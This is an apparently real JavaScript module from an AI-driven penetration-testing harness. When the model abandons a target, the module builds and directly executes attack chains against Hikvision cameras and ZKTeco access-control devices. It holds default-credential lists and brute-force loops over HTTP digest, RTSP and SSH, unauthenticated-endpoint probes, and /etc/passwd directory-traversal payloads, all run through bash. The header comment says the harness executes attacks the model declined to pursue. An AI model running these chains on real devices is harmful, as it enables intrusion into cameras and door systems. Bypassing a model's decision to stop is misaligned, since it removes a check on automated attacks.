// auto-escalation.js — When the model gives up on a target after shallow attempts,
// the harness queues deep automated attack chains directly. The model decides WHAT
// to attack; the harness ensures HOW is exhaustive.
//
// Same pattern as auto-playbook (model won't call the tool → harness calls it),
// but for execution: model won't try 50 passwords → harness tries them.

const db = require("/app/db");
const { spawn } = require("child_process");

function executeStep(itemId, command, engagementId) {
  return new Promise((resolve, reject) => {
    const timeout = 60_000; // 60s per step
    let output = "";
    let stderr = "";

    db.query(
      `UPDATE soc_queue_items SET status = 'running', started_at = NOW() WHERE id = $1`,
      [itemId]).catch(() => {});

    const proc = spawn("bash", ["-s"], { stdio: ["pipe", "pipe", "pipe"], detached: true });
    proc.stdin.write(command);
    proc.stdin.end();

    proc.stdout.on("data", d => { output += d.toString(); if (output.length > 50000) output = output.slice(-40000); });
    proc.stderr.on("data", d => { stderr += d.toString(); if (stderr.length > 10000) stderr = stderr.slice(-8000); });

    const timer = setTimeout(() => {
      try { process.kill(-proc.pid); } catch {}
      db.query(
        `UPDATE soc_queue_items SET status = 'failed', output = $1, completed_at = NOW() WHERE id = $2`,
        [output + "\n[TIMEOUT after 60s]\n" + stderr, itemId]).catch(() => {});
      resolve();
    }, timeout);

    proc.on("close", (code) => {
      clearTimeout(timer);
      const finalOutput = stderr ? output + "\n[stderr]\n" + stderr : output;
      const status = code === 0 ? "done" : "failed";
      db.query(
        `UPDATE soc_queue_items SET status = $1, output = $2, completed_at = NOW() WHERE id = $3`,
        [status, finalOutput, itemId])
        .then(() => resolve())
        .catch(e => { console.error(`[auto-escalation] db write failed:`, e.message); resolve(); });
    });

    proc.on("error", (e) => {
      clearTimeout(timer);
      db.query(
        `UPDATE soc_queue_items SET status = 'failed', output = $1, completed_at = NOW() WHERE id = $2`,
        [`spawn error: ${e.message}`, itemId]).catch(() => {});
      resolve();
    });
  });
}

const HIKVISION_PASSWORDS = [
  "12345", "admin", "hikvision", "123456", "888888", "666666",
  "1234", "abcd1234", "Abc123!!", "admin123", "1q2w3e4r",
  "password", "admin1", "Admin123", "hikadmin", "hik12345",
  "test", "root", "pass", "1111", "0000", "9999",
  "camera1", "Camera1", "supervisor", "service",
  "hik", "hikvision1", "Hikvision1", "HIK12345",
];

const ZKTECO_CREDS = [
  ["admin", "admin"], ["admin", "8888"], ["admin", "123456"],
  ["admin", ""], ["8888", "8888"], ["root", "root"],
  ["root", "solokey"], ["admin", "1234"], ["admin", "password"],
  ["user", "user"], ["admin", "admin123"],
];

const SSH_IOT_CREDS = [
  ["root", "root"], ["admin", "admin"], ["root", ""],
  ["admin", ""], ["root", "default"], ["root", "toor"],
  ["root", "12345"], ["root", "admin"], ["admin", "12345"],
  ["root", "password"], ["root", "1234"], ["admin", "1234"],
  ["service", "service"], ["root", "vizxv"], ["root", "xc3511"],
  ["root", "hi3518"], ["root", "juantech"], ["root", "anko"],
];

function buildHikvisionChain(ip) {
  const steps = [];

  // 1. Brute-force digest auth with top passwords
  const passBatches = [];
  for (let i = 0; i < HIKVISION_PASSWORDS.length; i += 5) {
    passBatches.push(HIKVISION_PASSWORDS.slice(i, i + 5));
  }
  passBatches.forEach((batch, idx) => {
    const checks = batch.map(p =>
      `r=$(curl -sk --digest -u admin:${p} --connect-timeout 10 --max-time 15 http://${ip}/ISAPI/System/deviceInfo 2>/dev/null); if echo "$r" | grep -q "<model>"; then echo "SUCCESS:admin:${p}"; echo "$r" | head -5; else echo "FAIL:admin:${p}"; fi`
    ).join("\n");
    steps.push({
      title: `[auto-escalation] Brute-force Hikvision creds batch ${idx + 1} on ${ip}`,
      command: `set +e\n${checks}`,
      description: `Passwords: ${batch.join(", ")}`,
    });
  });

  // 2. RTSP with common creds
  steps.push({
    title: `[auto-escalation] RTSP auth probe on ${ip}`,
    command: [
      `set +e`,
      `for cred in "" "admin:12345" "admin:admin" "admin:888888" "admin:hikvision"; do`,
      `  if [ -n "$cred" ]; then url="rtsp://$cred@${ip}:554/Streaming/Channels/101"; else url="rtsp://${ip}:554/Streaming/Channels/101"; fi`,
      `  echo "Testing: $url"`,
      `  r=$(curl -sv "$url" 2>&1 | head -10)`,
      `  if echo "$r" | grep -q "200 OK\\|RTSP/1.0 200"; then echo "RTSP_OPEN: $url"; fi`,
      `done`,
    ].join("\n"),
    description: "Test RTSP streams with common credentials",
  });

  // 3. All unauthenticated ISAPI endpoints
  steps.push({
    title: `[auto-escalation] Unauthenticated ISAPI endpoints on ${ip}`,
    command: [
      `set +e`,
      `for path in /ISAPI/Streaming/channels/101/picture /ISAPI/System/deviceInfo /ISAPI/System/time`,
      `  /ISAPI/System/Network/interfaces /ISAPI/Security/users /ISAPI/ContentMgmt/Storage`,
      `  /ISAPI/System/configurationData /onvif-http/snapshot /ISAPI/Streaming/channels/101/httpPreview`,
      `  /ISAPI/System/updateFirmware /ISAPI/System/reboot /doc/page/config.asp; do`,
      `  code=$(curl -sk --connect-timeout 10 --max-time 15 -o /dev/null -w '%{http_code}' "http://${ip}$path" 2>/dev/null)`,
      `  if [ "$code" != "000" ] && [ "$code" != "401" ] && [ "$code" != "404" ] && [ "$code" != "301" ]; then echo "UNAUTH_ACCESS $code: $path"; fi`,
      `done`,
    ].join("\n"),
    description: "Check all ISAPI endpoints for unauthenticated access",
  });

  // 4. ONVIF probe
  steps.push({
    title: `[auto-escalation] ONVIF device probe on ${ip}`,
    command: [
      `set +e`,
      `SOAP='<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>'`,
      `for port in 80 8000; do`,
      `  for path in /onvif/device_service /onvif-http/; do`,
      `    echo "Testing http://${ip}:$port$path"`,
      `    r=$(curl -sk --connect-timeout 10 --max-time 15 -X POST "http://${ip}:$port$path" -H "Content-Type: application/soap+xml" -d "$SOAP" 2>/dev/null)`,
      `    if echo "$r" | grep -qi "manufacturer\\|model\\|firmware"; then echo "ONVIF_OPEN: port $port path $path"; echo "$r" | head -10; fi`,
      `  done`,
      `done`,
    ].join("\n"),
    description: "ONVIF device discovery without credentials",
  });

  // 5. SSH brute-force with IoT defaults
  steps.push({
    title: `[auto-escalation] SSH brute-force IoT defaults on ${ip}`,
    command: [
      `set +e`,
      `which sshpass >/dev/null 2>&1 || apt-get install -y sshpass >/dev/null 2>&1`,
      ...SSH_IOT_CREDS.slice(0, 10).map(([u, p]) =>
        p
          ? `r=$(sshpass -p '${p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -o BatchMode=no ${u}@${ip} 'id; hostname' 2>&1); if echo "$r" | grep -q "uid="; then echo "SSH_SUCCESS:${u}:${p}"; echo "$r"; fi`
          : `r=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -o BatchMode=yes ${u}@${ip} 'id; hostname' 2>&1); if echo "$r" | grep -q "uid="; then echo "SSH_SUCCESS:${u}:(empty)"; echo "$r"; fi`
      ),
    ].join("\n"),
    description: "SSH with common IoT default credentials",
  });

  // 6. Port 9010 Hikvision SDK probe
  steps.push({
    title: `[auto-escalation] Hikvision SDK port 9010 probe on ${ip}`,
    command: [
      `set +e`,
      `echo "GET / HTTP/1.0\\r\\n\\r\\n" | nc -w 5 ${ip} 9010 2>/dev/null | head -20`,
      `echo "---"`,
      `echo '<?xml version="1.0"?><Probe/>' | nc -w 5 ${ip} 9010 2>/dev/null | head -20`,
    ].join("\n"),
    description: "Probe Hikvision SDK/management port",
  });

  return steps;
}

function buildZKTecoChain(ip) {
  const steps = [];

  // 1. Brute-force login
  ZKTECO_CREDS.forEach(([user, pass], idx) => {
    if (idx % 3 === 0) {
      const batch = ZKTECO_CREDS.slice(idx, idx + 3);
      const checks = batch.map(([u, p]) => [
        `echo "Testing ${u}:${p || '(empty)'}"`,
        `r=$(curl -sk --connect-timeout 10 --max-time 15 -X POST "https://${ip}/cgi-bin/login.cgi" -d "username=${u}&password=${p}" 2>/dev/null)`,
        `if ! echo "$r" | grep -qi "fail\\|error\\|invalid\\|denied"; then echo "POSSIBLE_LOGIN:${u}:${p}"; echo "$r" | head -5; fi`,
        `r2=$(curl -sk --connect-timeout 10 --max-time 15 -X POST "https://${ip}/api/login" -H "Content-Type: application/json" -d '{"username":"${u}","password":"${p}"}' 2>/dev/null)`,
        `if ! echo "$r2" | grep -qi "fail\\|error\\|invalid\\|denied"; then echo "POSSIBLE_API_LOGIN:${u}:${p}"; echo "$r2" | head -5; fi`,
      ].join("\n")).join("\n");
      steps.push({
        title: `[auto-escalation] ZKTeco cred test batch ${Math.floor(idx / 3) + 1} on ${ip}`,
        command: `set +e\n${checks}`,
        description: `Creds: ${batch.map(([u, p]) => `${u}:${p || "(empty)"}`).join(", ")}`,
      });
    }
  });

  // 2. Unauthenticated data endpoints
  steps.push({
    title: `[auto-escalation] ZKTeco unauth endpoints on ${ip}`,
    command: [
      `set +e`,
      `for path in /csl/user /csl/dept /form/DataApp?type=backup /deviceUsers /device/check`,
      `  /users /getUsers /iclock/getdata?type=user /iclock/cdata?type=user`,
      `  /cgi-bin/param.cgi?action=getSettings; do`,
      `  code=$(curl -sk --connect-timeout 10 --max-time 15 -o /tmp/zk_out -w '%{http_code}' "https://${ip}$path" 2>/dev/null)`,
      `  size=$(wc -c < /tmp/zk_out 2>/dev/null || echo 0)`,
      `  if [ "$code" != "000" ] && [ "$code" != "401" ] && [ "$code" != "404" ] && [ "$code" != "301" ] && [ "$size" -gt 50 ]; then`,
      `    echo "UNAUTH_DATA $code ($size bytes): $path"`,
      `    head -3 /tmp/zk_out`,
      `  fi`,
      `done`,
    ].join("\n"),
    description: "Check for unauthenticated data access (CVE-2022-42953)",
  });

  // 3. Directory traversal
  steps.push({
    title: `[auto-escalation] ZKTeco directory traversal on ${ip}`,
    command: [
      `set +e`,
      `for payload in "../../../../etc/passwd" "..%2f..%2f..%2f..%2fetc%2fpasswd"`,
      `  "....//....//....//etc/passwd" "/cgi-bin/../../etc/passwd"; do`,
      `  r=$(curl -sk --connect-timeout 10 --max-time 15 "https://${ip}/$payload" 2>/dev/null)`,
      `  if echo "$r" | grep -q "root:"; then echo "TRAVERSAL_SUCCESS: $payload"; echo "$r" | head -5; fi`,
      `done`,
    ].join("\n"),
    description: "Test directory traversal paths",
  });

  return steps;
}

function detectDeviceType(stepTitles, findingTitles) {
  const all = (stepTitles + " " + findingTitles).toLowerCase();
  if (all.includes("hikvision") || all.includes("isapi") || all.includes("hik")) return "hikvision";
  if (all.includes("zkteco") || all.includes("zkaccess") || all.includes("biometric")) return "zkteco";
  return null;
}

async function autoEscalate(engagementId, abandonedTarget) {
  const deviceType = await detectDeviceTypeFromDB(engagementId, abandonedTarget);
  if (!deviceType) {
    console.log(`[auto-escalation] no device type detected for ${abandonedTarget}, skipping`);
    return { queued: 0 };
  }

  const chain = deviceType === "hikvision"
    ? buildHikvisionChain(abandonedTarget)
    : deviceType === "zkteco"
    ? buildZKTecoChain(abandonedTarget)
    : [];

  if (chain.length === 0) return { queued: 0 };

  // Check if we already auto-escalated this target
  const existing = await db.query(
    `SELECT count(*) as c FROM soc_queue_items
     WHERE engagement_id = $1 AND title LIKE '[auto-escalation]%' AND title LIKE $2`,
    [engagementId, `%${abandonedTarget}%`]);
  if (parseInt(existing.rows[0].c) > 0) {
    console.log(`[auto-escalation] already escalated ${abandonedTarget}, skipping`);
    return { queued: 0, reason: "already_escalated" };
  }

  // Get next seq number
  const seqQ = await db.query(
    `SELECT COALESCE(MAX(seq), 0) + 1 as next_seq FROM soc_queue_items WHERE engagement_id = $1`,
    [engagementId]);
  let nextSeq = seqQ.rows[0].next_seq;

  // Queue all steps
  for (const step of chain) {
    await db.query(
      `INSERT INTO soc_queue_items (engagement_id, seq, title, command, description, status)
       VALUES ($1, $2, $3, $4, $5, 'pending')`,
      [engagementId, nextSeq++, step.title, step.command, step.description || ""]);
  }

  // Auto-execute them directly via spawn (same pattern as the queue runner)
  const pendingQ = await db.query(
    `SELECT id, command FROM soc_queue_items
     WHERE engagement_id = $1 AND title LIKE '[auto-escalation]%' AND status = 'pending'
     ORDER BY seq`,
    [engagementId]);

  let executed = 0;
  for (const row of pendingQ.rows) {
    try {
      await executeStep(row.id, row.command, engagementId);
      executed++;
    } catch (e) {
      console.error(`[auto-escalation] step ${row.id} failed:`, e.message);
    }
  }

  console.log(`[auto-escalation] queued ${chain.length} steps for ${deviceType} on ${abandonedTarget} (${executed} executed)`);

  // Record in telemetry
  await db.query(
    `INSERT INTO offense_telemetry (engagement_id, queue_item_id, model_used, intent_category, n_hosts, n_findings, step_queued, in_scope, n_references, latency_ms, outcome, outcome_notes)
     VALUES ($1, NULL, 'harness', 'auto_escalation', 1, 0, true, true, 0, 0, 'auto_escalation', $2)`,
    [engagementId, `${deviceType} chain on ${abandonedTarget}: ${chain.length} steps`]);

  return { queued: chain.length, executed, deviceType, target: abandonedTarget };
}

async function detectDeviceTypeFromDB(engagementId, ip) {
  const [stepsQ, findingsQ] = await Promise.all([
    db.query(
      `SELECT title FROM soc_queue_items WHERE engagement_id = $1 AND title LIKE $2`,
      [engagementId, `%${ip}%`]),
    db.query(
      `SELECT title FROM pentest_findings WHERE engagement_id = $1 AND (affected_asset LIKE $2 OR title LIKE $2)`,
      [engagementId, `%${ip}%`]),
  ]);
  const stepTitles = stepsQ.rows.map(r => r.title).join(" ");
  const findingTitles = findingsQ.rows.map(r => r.title).join(" ");
  return detectDeviceType(stepTitles, findingTitles);
}

// Check auto-escalation results and create findings for any successes
async function harvestEscalationResults(engagementId) {
  const doneQ = await db.query(
    `SELECT id, title, output, status FROM soc_queue_items
     WHERE engagement_id = $1 AND title LIKE '[auto-escalation]%' AND status = 'done'
     ORDER BY seq`,
    [engagementId]);

  const successes = [];
  for (const row of doneQ.rows) {
    const out = row.output || "";
    if (out.includes("SUCCESS:") || out.includes("RTSP_OPEN:") ||
        out.includes("UNAUTH_ACCESS") || out.includes("UNAUTH_DATA") ||
        out.includes("ONVIF_OPEN:") || out.includes("TRAVERSAL_SUCCESS:") ||
        out.includes("POSSIBLE_LOGIN:") || out.includes("POSSIBLE_API_LOGIN:")) {
      successes.push({ step: row.title, output: out.slice(0, 500) });
    }
  }

  // Auto-create findings for successes
  for (const s of successes) {
    const ipMatch = s.step.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
    const ip = ipMatch ? ipMatch[1] : "unknown";
    let severity = "high";
    let title = "";
    if (s.output.includes("SSH_SUCCESS:")) {
      severity = "critical";
      title = `SSH default credentials found on ${ip}`;
    } else if (s.output.includes("SUCCESS:")) {
      severity = "critical";
      title = `Hikvision admin credentials found on ${ip}`;
    } else if (s.output.includes("RTSP_OPEN:")) {
      severity = "high";
      title = `Unauthenticated RTSP stream accessible on ${ip}`;
    } else if (s.output.includes("UNAUTH_ACCESS") || s.output.includes("UNAUTH_DATA")) {
      severity = "high";
      title = `Unauthenticated endpoint accessible on ${ip}`;
    } else if (s.output.includes("TRAVERSAL_SUCCESS:")) {
      severity = "critical";
      title = `Directory traversal vulnerability on ${ip}`;
    } else if (s.output.includes("ONVIF_OPEN:")) {
      severity = "medium";
      title = `ONVIF device info accessible without auth on ${ip}`;
    } else {
      title = `Potential access found on ${ip} (auto-escalation)`;
    }

    // Check if this finding already exists
    const existQ = await db.query(
      `SELECT id FROM pentest_findings WHERE engagement_id = $1 AND title = $2`,
      [engagementId, title]);
    if (existQ.rows.length === 0) {
      await db.query(
        `INSERT INTO pentest_findings (engagement_id, title, severity, affected_asset, description, status)
         VALUES ($1, $2, $3, $4, $5, 'open')`,
        [engagementId, title, severity, ip, `Auto-escalation finding:\n${s.output.slice(0, 1000)}`]);
      successes.push({ ...s, finding_created: true });
      console.log(`[auto-escalation] created finding: ${title}`);
    }
  }

  return successes;
}

module.exports = { autoEscalate, harvestEscalationResults, buildHikvisionChain, buildZKTecoChain };
